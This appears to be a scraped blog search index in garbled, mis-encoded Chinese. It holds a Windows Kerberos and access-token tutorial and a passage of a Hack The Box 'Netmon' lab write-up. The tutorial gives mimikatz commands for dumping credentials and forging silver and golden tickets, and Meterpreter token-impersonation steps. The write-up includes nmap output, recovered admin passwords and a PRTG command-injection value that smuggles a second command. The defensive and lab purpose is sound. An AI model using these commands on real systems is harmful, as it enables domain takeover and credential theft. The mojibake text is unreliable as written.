","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:3:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","è®¤è¯"],"title":"Windows è®¤è¯","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åŸŸè®¤è¯ä½“ç³» - Kerberoes Kerberos æ˜¯ä¸€ç§ç½‘ç»œè®¤è¯åè®®ï¼Œå…¶è®¾è®¡ç›®æ ‡æ˜¯é€šè¿‡å¯†é’¥ç³»ç»Ÿä¸ºå®¢æˆ·æœº/æœåŠ¡å™¨åº”ç”¨ç¨‹åºæä¾›å¼ºå¤§çš„è®¤è¯æœåŠ¡ã€‚è¯¥è®¤è¯è¿‡ç¨‹çš„å®ç°ä¸ä¾èµ–äºä¸»æœºæ“ä½œç³»ç»Ÿçš„è®¤è¯ï¼Œæ— éœ€åŸºäºä¸»æœºåœ°å€çš„ä¿¡ä»»ï¼Œä¸è¦æ±‚ç½‘ç»œä¸Šæ‰€æœ‰ä¸»æœºçš„ç‰©ç†å®‰å…¨ï¼Œå¹¶å‡å®šç½‘ç»œä¸Šä¼ é€çš„æ•°æ®åŒ…å¯ä»¥è¢«ä»»æ„åœ°è¯»å–ã€ä¿®æ”¹å’Œæ’å…¥æ•°æ®ã€‚åœ¨ä»¥ä¸Šæƒ…å†µä¸‹ï¼ŒKerberosä½œä¸ºä¸€ç§å¯ä¿¡ä»»çš„ç¬¬ä¸‰æ–¹è®¤è¯æœåŠ¡ï¼Œæ˜¯é€šè¿‡ä¼ ç»Ÿçš„å¯†ç æŠ€æœ¯(å¦‚:å…±äº«å¯†é’¥)æ‰§è¡Œè®¤è¯æœåŠ¡çš„ã€‚ ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:3:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","è®¤è¯"],"title":"Windows è®¤è¯","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åŸŸè®¤è¯æ‰€å‚ä¸çš„è§’è‰² Kerberosçš„æ ‡å¿—æ˜¯ä¸‰åªç‹—å¤´ï¼Œç‹—å¤´åˆ†åˆ«ä»£è¡¨ä»¥ä¸‹è§’è‰²ï¼š Client Server KDC(Key Distribution Center) = DC(Domain Controller) ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:3:4","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","è®¤è¯"],"title":"Windows è®¤è¯","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åŸŸè®¤è¯æ‰€å‚ä¸çš„è§’è‰² AD(Account database): å­˜å‚¨æ‰€æœ‰ client çš„ç™½åå•ï¼Œåªæœ‰å­˜åœ¨äºç™½åå•çš„ client æ‰èƒ½é¡ºåˆ©ç”³è¯·åˆ°TGT Authentication Service: ä¸º client ç”Ÿæˆ TGT çš„æœåŠ¡ Ticket Granting Service: ä¸º client ç”ŸæˆæŸä¸ªæœåŠ¡çš„ ticket ä»ç‰©ç†å±‚é¢çœ‹ï¼ŒAD ä¸ KDC å‡ä¸ºåŸŸæ§åˆ¶å™¨(Domain Controller)ã€‚ ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:3:5","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","è®¤è¯"],"title":"Windows è®¤è¯","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åŸŸè®¤è¯ç²—ç•¥æµç¨‹ client å‘ kerberos æœåŠ¡è¯·æ±‚ï¼Œå¸Œæœ›è·å–è®¿é—® server çš„æƒé™ã€‚ kerberos å¾—åˆ°äº†è¿™ä¸ªæ¶ˆæ¯ï¼Œé¦–å…ˆå¾—åˆ¤æ–­ client æ˜¯å¦æ˜¯å¯ä¿¡èµ–çš„ï¼Œä¹Ÿå°±æ˜¯ç™½åå•é»‘åå•çš„è¯´æ³•ã€‚è¿™å°±æ˜¯ AS æœåŠ¡å®Œæˆçš„å·¥ä½œï¼Œé€šè¿‡åœ¨ AD ä¸­å­˜å‚¨é»‘åå•å’Œç™½åå•æ¥åŒºåˆ† clientã€‚æˆåŠŸåï¼Œè¿”å› AS è¿”å› TGT ç»™ clientã€‚ client å¾—åˆ°äº† TGT åï¼Œç»§ç»­å‘ kerberos è¯·æ±‚ï¼Œå¸Œæœ›è·å–è®¿é—® server çš„æƒé™ã€‚ kerberos åˆå¾—åˆ°äº†è¿™ä¸ªæ¶ˆæ¯ï¼Œè¿™æ—¶å€™é€šè¿‡ client æ¶ˆæ¯ä¸­çš„ TGTï¼Œåˆ¤æ–­å‡ºäº† client æ‹¥æœ‰äº†è¿™ä¸ªæƒé™ï¼Œç»™äº† client è®¿é—® server çš„æƒé™ ticketã€‚ client å¾—åˆ° ticket åï¼Œç»ˆäºå¯ä»¥æˆåŠŸè®¿é—® serverã€‚è¿™ä¸ª ticket åªæ˜¯é’ˆå¯¹è¿™ä¸ª serverï¼Œå…¶ä»– server éœ€è¦å‘ TGS ç”³è¯·ã€‚ ç¬¬ä¸€æ­¥ Session Key ä¸ Ticket Granting Ticket ç¬¬äºŒæ­¥ Session Key ä¸ Ticket Granting Ticket ç¬¬ä¸‰æ­¥ Server Session Key ä¸ Ticket ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:3:6","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","è®¤è¯"],"title":"Windows è®¤è¯","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç™½é“¶ç¥¨æ® ç™½é“¶ç¥¨æ®çš„ç‰¹ç‚¹ï¼š ä¸éœ€è¦ä¸ KDC è¿›è¡Œäº¤äº’ éœ€è¦ç›®æ ‡æœåŠ¡çš„ NTLM Hash åœ¨ç¬¬ä¸‰æ­¥è®¤è¯ä¸­çš„ Ticket çš„ç»„æˆï¼š Ticket = Server Hash(Server Session Key + Client info + End Time) å½“æ‹¥æœ‰ Server Hash æ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¼ªé€ ä¸€ä¸ªä¸ç»è¿‡ KDC è®¤è¯çš„ä¸€ä¸ª Ticketã€‚ PSï¼šServer Session Key åœ¨æœªå‘é€ Ticket ä¹‹å‰ï¼ŒæœåŠ¡å™¨æ˜¯ä¸çŸ¥é“ Server Session Key æ˜¯ä»€ä¹ˆçš„ã€‚ æ‰€ä»¥ï¼Œä¸€åˆ‡å‡­æ®éƒ½æ¥æºäº Server Hashã€‚ ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:3:7","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","è®¤è¯"],"title":"Windows è®¤è¯","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ä¼ªé€ ç™½é“¶ç¥¨æ® é¦–å…ˆéœ€è¦å¯¼å‡ºServer Hashï¼š C:\\files\u003emimikatz.exe \"privilege::debugâ€ \"sekurlsa::logonpasswords\" \"exit\" \u003e log.txt ä¼ªé€ ç¥¨æ®: mimikatz â€œkerberos::golden /domain:\u003cåŸŸå\u003e /sid:\u003cåŸŸ SID\u003e /target:\u003cç›®æ ‡æœåŠ¡å™¨ä¸»æœºå\u003e /service:\u003cæœåŠ¡ç±»å‹\u003e /rc4:\u003cNTLM Hash\u003e /user:\u003cç”¨æˆ·å\u003e /ptt\" exit Otherï¼š kerberos::list #åˆ—å‡ºç¥¨æ® kerberos::purge # æ¸…é™¤ç¥¨æ® ç”±äºç™½é“¶ç¥¨æ®éœ€è¦ç›®æ ‡æœåŠ¡å™¨çš„Hashï¼Œæ‰€ä»¥æ²¡åŠæ³•ç”Ÿæˆå¯¹åº”åŸŸå†…æ‰€æœ‰æœåŠ¡å™¨çš„ç¥¨æ®ï¼Œä¹Ÿä¸èƒ½é€šè¿‡TGTç”³è¯·ã€‚å› æ­¤åªèƒ½é’ˆå¯¹æœåŠ¡å™¨ä¸Šçš„æŸäº›æœåŠ¡å»ä¼ªé€ ï¼Œä¼ªé€ çš„æœåŠ¡ç±»å‹åˆ—è¡¨å¦‚ä¸‹: æœåŠ¡æ³¨é‡Š æœåŠ¡å WMI HOSTã€RPCSS Powershell Remoteing HOSTã€HTTP WinRM HOSTã€HTTP Scheduled Tasks HOST LDAP ã€DCSync LDAP Windows File Share (CIFS) CIFS Windows Remote ServerAdministration Tools RPCSSã€LDAPã€CIFS ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:3:8","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","è®¤è¯"],"title":"Windows è®¤è¯","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç™½é“¶ç¥¨æ®(Silver Tickets)é˜²å¾¡ å°½é‡ä¿è¯æœåŠ¡å™¨å‡­è¯ä¸è¢«çªƒå– å¼€å¯PAC (Privileged Attribute Certificate) ç‰¹æƒå±æ€§è¯ä¹¦ä¿æŠ¤ åŠŸèƒ½ï¼ŒPACä¸»è¦æ˜¯è§„å®šæœåŠ¡å™¨å°†ç¥¨æ®å‘é€ç»™kerberosæœåŠ¡ï¼Œç”±kerberosæœåŠ¡éªŒè¯ç¥¨æ®æ˜¯å¦æœ‰æ•ˆã€‚ å¼€å¯æ–¹å¼: å°†æ³¨å†Œè¡¨ä¸­HKEY_LOCAL_MACHINE\\SYSTEM \\ CurrentControlSet\\Control\\Lsa\\Kerberos\\Parametersä¸­çš„ValidateKdcPacSignatureè®¾ç½®ä¸º1 ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:3:9","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","è®¤è¯"],"title":"Windows è®¤è¯","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"é»„é‡‘ç¥¨æ®(Golden Tickets) é»„é‡‘ç¥¨æ®ç‰¹ç‚¹: éœ€è¦ä¸DCé€šä¿¡ éœ€è¦krbtgtç”¨æˆ·çš„hash PS:è¿™é‡Œçš„krbtgt hashå°±æ˜¯ä¹‹å‰è®²çš„KDC Hash æ³¨æ„:è¿™é‡Œçš„krbtgt hashå°±æ˜¯ä¹‹å‰è®²çš„KDC Hash ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:3:10","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","è®¤è¯"],"title":"Windows è®¤è¯","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"é»„é‡‘ç¥¨æ®(Golden Tickets)-MSF kiwi ä½¿ç”¨meterpreterä¸­çš„kiwiæ¨¡å—ï¼š load kiwi ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:3:11","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","è®¤è¯"],"title":"Windows è®¤è¯","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"é»„é‡‘ç¥¨æ®(Golden Tickets) - ä¼ªé€  ä¼ªé€ ç¥¨æ®: mimikatz â€œkerberos::golden /domain:\u003cåŸŸå\u003e /sid:\u003cåŸŸSID\u003e /rc4:\u003cKRBTGT NTLM Hash\u003e /user:\u003cä»»æ„ç”¨æˆ·å\u003e /ptt\" exit ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:3:12","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","è®¤è¯"],"title":"Windows è®¤è¯","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Tickets æ€»ç»“ é»„é‡‘ç¥¨æ®:ä»æ”»å‡»é¢æ¥çœ‹ï¼Œè·å–krbtgtç”¨æˆ·çš„hashåï¼Œå¯ä»¥åœ¨åŸŸä¸­ è¿›è¡ŒæŒä¹…æ€§çš„éšè—ï¼Œå¹¶ä¸”æ—¥å¿—æ— æ³•æº¯æºï¼Œä½†æ˜¯éœ€è¦æ‹¿åˆ°DCæƒé™ï¼Œ ä½¿ç”¨é»„é‡‘ç¥¨æ®èƒ½å¤Ÿåœ¨ä¸€ä¸ªåŸŸç¯å¢ƒä¸­é•¿æ—¶é—´æ§åˆ¶æ•´ä¸ªåŸŸã€‚ ä»é˜²å¾¡è§’åº¦æ¥çœ‹ï¼Œéœ€è¦ç»å¸¸æ›´æ–°krbtgtçš„å¯†ç ï¼Œæ‰èƒ½å¤Ÿä½¿å¾—åŸæœ‰çš„ ç¥¨æ®å¤±æ•ˆã€‚æœ€æ ¹æœ¬çš„åŠæ³•æ˜¯ä¸å…è®¸åŸŸç®¡è´¦æˆ·ç™»å½•å…¶ä»–æœåŠ¡å™¨ã€‚ ç™½é“¶ç¥¨æ®:ä»æ”»å‡»é¢æ¥çœ‹ï¼Œä¼ªé€ ç™½é“¶ç¥¨æ®çš„éš¾åº¦æ¯”ä¼ªé€ é»„é‡‘ç¥¨æ®çš„ éš¾åº¦è¾ƒå°ï¼Œå› ä¸ºä¸€ä¸ªåŸŸä¸­çš„æœåŠ¡å™¨å¦‚æœå¯¹å¤–çš„è¯ï¼Œéå¸¸å®¹æ˜“è¢«å…¥ä¾µï¼Œ å¹¶ä¸”å®¹æ˜“è¢«è½¬å‚¨Serverã€‚ ä»é˜²å¾¡è§’åº¦æ¥çœ‹ï¼Œéœ€è¦å¼€å¯PACè®¤è¯ï¼Œä½†è¿™ä¼šé™ä½è®¤è¯æ•ˆç‡ï¼Œå¢åŠ  DCçš„è´Ÿæ‹…ï¼Œæœ€æ ¹æœ¬çš„è¿˜æ˜¯è¦åŠ å›ºæœåŠ¡å™¨æœ¬èº«å¯¹å¤–çš„æœåŠ¡ã€‚ ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:3:13","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","è®¤è¯"],"title":"Windows è®¤è¯","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Windows Access Token ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:4:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","è®¤è¯"],"title":"Windows è®¤è¯","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Windows Access Tokenç®€ä»‹ Windows Tokenå…¶å®å«Access Token(è®¿é—®ä»¤ç‰Œ)ï¼Œå®ƒæ˜¯ä¸€ä¸ªæè¿°è¿›ç¨‹æˆ–è€…çº¿ç¨‹å®‰å…¨ä¸Šä¸‹æ–‡çš„ä¸€ä¸ªå¯¹è±¡ã€‚ä¸åŒçš„ç”¨æˆ·ç™»å½•è®¡ç®—æœºåï¼Œéƒ½ä¼šç”Ÿæˆä¸€ä¸ªAccess Tokenï¼Œè¿™ä¸ªTokenåœ¨ç”¨æˆ·åˆ›å»ºè¿›ç¨‹æˆ–è€…çº¿ç¨‹ æ—¶ä¼šè¢«ä½¿ç”¨ï¼Œä¸æ–­çš„æ‹·è´ï¼Œè¿™ä¹Ÿå°±è§£é‡Šäº†Aç”¨æˆ·åˆ›å»ºä¸€ä¸ªè¿›ç¨‹è€Œè¯¥è¿›ç¨‹æ²¡æœ‰Bç”¨æˆ·çš„æƒé™ã€‚ Access Tokenç§ç±»ï¼š ä¸»ä»¤ç‰Œ æ¨¡æ‹Ÿä»¤ç‰Œ ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œç”¨æˆ·åŒå‡»è¿è¡Œä¸€ä¸ªç¨‹åºï¼Œéƒ½ä¼šæ‹·è´â€œexplorer.exeâ€çš„Access Tokenã€‚ å½“ç”¨æˆ·æ³¨é”€åï¼Œç³»ç»Ÿå°†ä¼šä½¿ä¸»ä»¤ç‰Œåˆ‡æ¢ä¸ºæ¨¡æ‹Ÿä»¤ç‰Œï¼Œä¸ä¼šå°†ä»¤ç‰Œæ¸…é™¤ï¼Œåªæœ‰åœ¨é‡å¯æœºå™¨åæ‰ä¼šæ¸…é™¤ã€‚ ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:4:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","è®¤è¯"],"title":"Windows è®¤è¯","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Access Tokençš„ç»„æˆ ç”¨æˆ·å¸æˆ·çš„å®‰å…¨æ ‡è¯†ç¬¦(SID) ç”¨æˆ·æ‰€å±çš„ç»„çš„SID ç”¨äºæ ‡è¯†å½“å‰ç™»å½•ä¼šè¯çš„ç™»å½•SID ç”¨æˆ·æˆ–ç”¨æˆ·ç»„æ‰€æ‹¥æœ‰çš„æƒé™åˆ—è¡¨ æ‰€æœ‰è€…SID ä¸»è¦ç»„çš„SID è®¿é—®æ§åˆ¶åˆ—è¡¨ è®¿é—®ä»¤ç‰Œçš„æ¥æº ä»¤ç‰Œæ˜¯ä¸»è¦ä»¤ç‰Œè¿˜æ˜¯æ¨¡æ‹Ÿä»¤ç‰Œ é™åˆ¶SIDçš„å¯é€‰åˆ—è¡¨ ç›®å‰çš„æ¨¡æ‹Ÿç­‰çº§ å…¶ä»–ç»Ÿè®¡æ•°æ® ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:4:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","è®¤è¯"],"title":"Windows è®¤è¯","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Windows Access Token â€“ SID (Security Identifiers)å®‰å…¨æ ‡è¯†ç¬¦ å®‰å…¨æ ‡è¯†ç¬¦æ˜¯ä¸€ä¸ªå”¯ä¸€çš„å­—ç¬¦ä¸²ï¼Œå®ƒå¯ä»¥ä»£è¡¨ä¸€ä¸ªè´¦æˆ·ã€ä¸€ä¸ªç”¨æˆ· ç»„ã€æˆ–è€…æ˜¯ä¸€æ¬¡ç™»å½•ã€‚é€šå¸¸å®ƒè¿˜æœ‰ä¸€ä¸ªSIDå›ºå®šåˆ—è¡¨ï¼Œä¾‹å¦‚ Everyoneè¿™ç§å·²ç»å†…ç½®çš„è´¦æˆ·ï¼Œé»˜è®¤æ‹¥æœ‰å›ºå®šçš„SIDã€‚ SIDçš„è¡¨ç°å½¢å¼: åŸŸSID-ç”¨æˆ·ID è®¡ç®—æœºSID-ç”¨æˆ·ID SIDåˆ—è¡¨éƒ½ä¼šå­˜å‚¨åœ¨åŸŸæ§çš„ADæˆ–è€…è®¡ç®—æœºæœ¬åœ°è´¦æˆ·æ•°æ®åº“ä¸­ã€‚ ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:4:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","è®¤è¯"],"title":"Windows è®¤è¯","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Windows Access Tokenäº§ç”Ÿè¿‡ç¨‹ æ¯ä¸ªè¿›ç¨‹åˆ›å»ºæ—¶éƒ½ä¼šæ ¹æ®ç™»å½•ä¼šè¯æƒé™ç”±LSA(Local Security Authority)åˆ†é…ä¸€ä¸ªToken(å¦‚æœCreaetProcessæ—¶è‡ªå·±æŒ‡å®šäº† Token, LSAä¼šç”¨è¯¥Tokenï¼Œ å¦åˆ™å°±ç”¨çˆ¶è¿›ç¨‹Tokençš„ä¸€ä»½æ‹·è´ã€‚ ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:4:4","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","è®¤è¯"],"title":"Windows è®¤è¯","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Windows Access Tokenä»¤ç‰Œå‡å†’å®æˆ˜ å½“ç”¨æˆ·æ³¨é”€åï¼Œç³»ç»Ÿå°†ä¼šä½¿ä¸»ä»¤ç‰Œåˆ‡æ¢ä¸ºæ¨¡æ‹Ÿä»¤ç‰Œï¼Œä¸ä¼šå°†ä»¤ç‰Œæ¸…é™¤ï¼Œåªæœ‰åœ¨é‡å¯æœºå™¨åæ‰ä¼šæ¸…é™¤ã€‚ å¯ä»¥ä½¿ç”¨å¤šç§å·¥å…·æŸ¥çœ‹ç›®å‰ç³»ç»Ÿä¸Šå­˜åœ¨çš„æ¨¡æ‹Ÿä»¤ç‰Œ: Incognito Powershell - Invoke-TokenManipulation.ps1 Cobalt Strike - steal_token æ¡ˆä¾‹(é’ˆå¯¹æŸè·¨å›½ä¼ä¸šçš„ä¸€æ¬¡æ¸—é€æµ‹è¯• è·å–DCæƒé™ï¼‰: http://blog.360ec.net/archives/32/ meterpreter \u003e getsystem meterpreter \u003e load incognito meterpreter \u003e list_tokens â€“u Delegation Tokens Available ============================== NT AUTHORITY\\LOCAL SERVICENT AUTHORITY\\NETWORK SERVICENT AUTHORITY\\SYSTEM PAYLOADS\\Administrator PAYLOADS\\w7 meterpreter \u003e impersonate_token \"PAYLOADS\\\\Administratorâ€ [+] Delegation token available [+] Successfully impersonated user PAYLOADS\\Administrator ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:4:5","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","è®¤è¯"],"title":"Windows è®¤è¯","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Windows Access Tokenä»¤ç‰Œå‡å†’é˜²å¾¡ ç¦æ­¢Domain Adminsç™»å½•å¯¹å¤–ä¸”æœªåšå®‰å…¨åŠ å›ºçš„æœåŠ¡å™¨ï¼Œå› ä¸ºä¸€æ—¦æœåŠ¡å™¨è¢«å…¥ä¾µï¼ŒåŸŸç®¡ç†å‘˜çš„ä»¤ç‰Œå¯èƒ½ä¼šè¢«æ”»å‡»è€…å‡å†’ï¼Œä»æ§åˆ¶DCã€‚ å¦‚æœæƒ³æ¸…é™¤å‡å†’ï¼Œé‡å¯æœåŠ¡å™¨å³å¯ã€‚ ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:4:6","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","è®¤è¯"],"title":"Windows è®¤è¯","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["é¶åœº"],"content":"Hack The Boxé¶åœºç»ƒä¹ è®°å½•","date":"2019-06-10","objectID":"/2019/06/hack-the-boxnetmon/","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Netmon","uri":"/2019/06/hack-the-boxnetmon/"},{"categories":["é¶åœº"],"content":"Netmon-Windows https://www.hackthebox.eu/home/machines/profile/177 IP: 10.10.10.152 ","date":"2019-06-10","objectID":"/2019/06/hack-the-boxnetmon/:0:0","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Netmon","uri":"/2019/06/hack-the-boxnetmon/"},{"categories":["é¶åœº"],"content":"nmap æ‰«æ Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-10 19:45 CST NSE: Loaded 148 scripts for scanning. NSE: Script Pre-scanning. Initiating NSE at 19:45 Completed NSE at 19:45, 0.00s elapsed Initiating NSE at 19:45 Completed NSE at 19:45, 0.00s elapsed Initiating Ping Scan at 19:45 Scanning 10.10.10.152 [4 ports] Completed Ping Scan at 19:45, 0.32s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 19:45 Completed Parallel DNS resolution of 1 host. at 19:45, 0.03s elapsed Initiating SYN Stealth Scan at 19:45 Scanning 10.10.10.152 [1000 ports] Discovered open port 135/tcp on 10.10.10.152 Discovered open port 139/tcp on 10.10.10.152 Discovered open port 445/tcp on 10.10.10.152 Discovered open port 80/tcp on 10.10.10.152 Discovered open port 21/tcp on 10.10.10.152 Increasing send delay for 10.10.10.152 from 0 to 5 due to 23 out of 56 dropped probes since last increase. Completed SYN Stealth Scan at 19:46, 51.60s elapsed (1000 total ports) Initiating Service scan at 19:46 Scanning 5 services on 10.10.10.152 Completed Service scan at 19:46, 11.53s elapsed (5 services on 1 host) Initiating OS detection (try #1) against 10.10.10.152 Retrying OS detection (try #2) against 10.10.10.152 Retrying OS detection (try #3) against 10.10.10.152 Retrying OS detection (try #4) against 10.10.10.152 Retrying OS detection (try #5) against 10.10.10.152 Initiating Traceroute at 19:46 Completed Traceroute at 19:46, 0.36s elapsed Initiating Parallel DNS resolution of 2 hosts. at 19:46 Completed Parallel DNS resolution of 2 hosts. at 19:46, 0.04s elapsed NSE: Script scanning 10.10.10.152. Initiating NSE at 19:46 NSE: [ftp-bounce] PORT response: 501 Server cannot accept argument. Completed NSE at 19:46, 11.52s elapsed Initiating NSE at 19:46 Completed NSE at 19:46, 0.00s elapsed Nmap scan report for 10.10.10.152 Host is up (0.30s latency). Not shown: 995 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 02-03-19 12:18AM 1024 .rnd | 02-25-19 10:15PM \u003cDIR\u003e inetpub | 07-16-16 09:18AM \u003cDIR\u003e PerfLogs | 02-25-19 10:56PM \u003cDIR\u003e Program Files | 02-03-19 12:28AM \u003cDIR\u003e Program Files (x86) | 02-03-19 08:08AM \u003cDIR\u003e Users |_02-25-19 11:49PM \u003cDIR\u003e Windows | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor) |_http-favicon: Unknown favicon MD5: 36B3EF286FA4BEFBB797A0966B456479 | http-methods: |_ Supported Methods: GET HEAD |_http-server-header: PRTG/18.1.37.13946 | http-title: Welcome | PRTG Network Monitor (NETMON) |_Requested resource was /index.htm |_http-trane-info: Problem with XML parsing of /evox/about 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 15s, deviation: 0s, median: 15s | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2019-06-10 19:47:00 |_ start_date: 2019-06-10 18:23:19 TRACEROUTE (using port 25/tcp) HOP RTT ADDRESS 1 341.39 ms 10.10.14.1 2 341.99 ms 10.10.10.152 NSE: Script Post-scanning. Initiating NSE at 19:46 Completed NSE at 19:46, 0.00s elapsed Initiating NSE at 19:46 Completed NSE at 19:46, 0.00s elapsed Read data files from: /usr/local/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 93.12 seconds Raw packets sent: 1275 (60.374KB) | Rcvd: 1540 (139.830KB) ! ","date":"2019-06-10","objectID":"/2019/06/hack-the-boxnetmon/:1:0","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Netmon","uri":"/2019/06/hack-the-boxnetmon/"},{"categories":["é¶åœº"],"content":"FTP åŒ¿åç™»å½• å‘ç° ftp å¯ä»¥åŒ¿åè®¿é—®ï¼š åœ¨/Users/Public/user.txt 80 ç«¯å£è¿è¡Œ PRTG Network Monitor æœåŠ¡ åœ¨ c:\\Windows\\ ä¸‹å‘ç°é…ç½®æ–‡ä»¶ restart.bat net stop PRTGCoreService copy \"c:\\Windows\\PRTG Configuration.dat\" \"C:\\ProgramData\\Paessler\\PRTG Network Monitor\" net start PRTGCoreService åœ¨ C:\\ProgramData\\Paessler\\PRTG Network Monitor ç›®å½•ä¸­å‘ç°å¤‡ä»½æ–‡ä»¶ PRTG Configuration.old.bakã€‚ æŸ¥æ‰¾åˆ°æ˜æ–‡ç”¨æˆ·å: prtgadminã€‚å¯†ç  PrTg@dmin2018ï¼Œå°è¯•ç™»é™†åå¤±è´¥ï¼ŒPrTg@dmin2019 ç™»é™†æˆåŠŸã€‚ ","date":"2019-06-10","objectID":"/2019/06/hack-the-boxnetmon/:2:0","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Netmon","uri":"/2019/06/hack-the-boxnetmon/"},{"categories":["é¶åœº"],"content":"å·²çŸ¥æ¼æ´æœç´¢ Google æœç´¢ PRTG æ¼æ´ï¼Œå‘ç°PRTG \u003c 18.2.39 Command Injection Vulnerability å¾—åˆ°ï¼šåœ¨Devices èœå•ä¸‹çš„ Notifications ä¸‹å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚ åœ¨ Execute Program ä¸‹ è®¾ç½®å‚æ•°ä¸ºä¸‹å›¾æ‰€ç¤ºï¼Œå¹¶ä¿å­˜è®¾ç½®ã€‚ test.txt;tree /f c:\\Users\\Administrator \u003e c:\\output.txt è¿›å…¥ Devices 